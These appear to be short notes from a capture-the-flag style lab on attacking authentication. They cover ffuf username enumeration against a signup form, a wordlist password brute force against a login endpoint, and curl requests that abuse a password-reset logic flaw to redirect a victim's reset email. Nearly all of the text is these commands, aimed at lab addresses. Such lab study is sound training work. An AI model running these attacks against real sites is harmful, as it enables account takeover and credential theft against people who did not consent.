--- What is ffuf? ---
ffuf fuzz faster u fool. Fuzzing is a technique for locating implementation bugs by using malformed/semi-malformed data injection in an automated fashion.

--- Username enum ---
Spam a bunch of usernames from wordlists and gather results

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/signup -mr "username already exists"

create a valid_usenames.txt from results located above, use for next command:

--- Brute force ---
Spam a bunch of usernames from previously gathered results and passwords from wordlist

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/login -fc 200

--- Logic flaw ---
Manually make request on form to reset password

Just a test below.
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

This is the full command to get the reset password email sent to your recently created user account.

curl 'http://10.10.142.106/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
